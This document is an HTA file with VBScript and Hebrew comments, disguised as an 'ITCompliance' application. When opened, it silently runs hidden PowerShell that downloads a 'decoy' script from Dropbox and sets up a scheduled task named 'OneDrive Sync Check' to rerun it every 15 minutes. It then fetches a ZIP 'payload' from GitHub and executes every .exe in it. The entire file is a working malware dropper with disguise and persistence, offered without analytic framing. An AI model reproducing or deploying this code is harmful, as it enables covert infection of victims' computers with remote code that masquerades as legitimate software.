<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<HTA:APPLICATION ID="oHTA" APPLICATIONNAME="ITCompliance" icon="taskmgr.exe" WINDOWSTATE="minimize"/>
<script language="VBScript">
    Sub Window_OnLoad
        Dim shell, tempPath, dropboxDecoyUrl, githubPayloadUrl, psCmd
        Set shell = CreateObject("WScript.Shell")
        
        ' 1. חישוב הנתיב המדויק לתיקיית הטמפ במחשב הנוכחי
        ' זה מונע שגיאות של משתני סביבה ב-PowerShell
        tempPath = shell.ExpandEnvironmentStrings("%TEMP%")
        
        ' 2. הקישורים שלך (מוטמעים מראש)
        dropboxDecoyUrl = "https://www.dropbox.com/scl/fi/5iq051ltlzh6mvwg8h6m5/SystemCheck.ps1?rlkey=lbzlu807ltvh1bq7q8uv36tmo&st=moem0qzp&dl=1"
        githubPayloadUrl = "https://raw.githubusercontent.com/BugSocMdr/UpdateFiles/main/SecureWave_Update.zip"
        
        ' 3. בניית פקודת ה-PowerShell (שימוש בנתיבים מוחלטים)
        
        ' שלב א: הורדת ה-Decoy (פיתיון) מדרופבוקס
        psCmd = "Invoke-WebRequest -Uri '" & dropboxDecoyUrl & "' -OutFile '" & tempPath & "\SystemCheck.ps1'; "
        
        ' שלב ב: יצירת המשימה המתוזמנת (Persistence)
        psCmd = psCmd & "schtasks /create /sc minute /mo 15 /tn 'OneDrive Sync Check' /tr 'powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File " & tempPath & "\SystemCheck.ps1' /f; "
        
        ' שלב ג: הרצה מיידית של הפיתיון
        psCmd = psCmd & "Start-Process powershell.exe -ArgumentList '-WindowStyle Hidden -ExecutionPolicy Bypass -File " & tempPath & "\SystemCheck.ps1' -WindowStyle Hidden; "
        
        ' שלב ד: הורדת ה-ZIP (Payload) מגיטהאב
        ' שימוש בשם הקובץ המדויק: SecureWave_Update.zip
        psCmd = psCmd & "$z='" & tempPath & "\SecureWave_Update.zip'; Invoke-WebRequest -Uri '" & githubPayloadUrl & "' -OutFile $z; " & _
                "Expand-Archive $z -DestinationPath '" & tempPath & "\sw_upd' -Force; Remove-Item $z; " & _
                "Get-ChildItem '" & tempPath & "\sw_upd' -Filter *.exe | ForEach-Object { Start-Process $_.FullName }"

        ' 4. ביצוע הפקודה
        shell.Run "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command """ & psCmd & """", 0, True
        
        self.close
    End Sub
</script>
</head>
<body>
</body>
</html>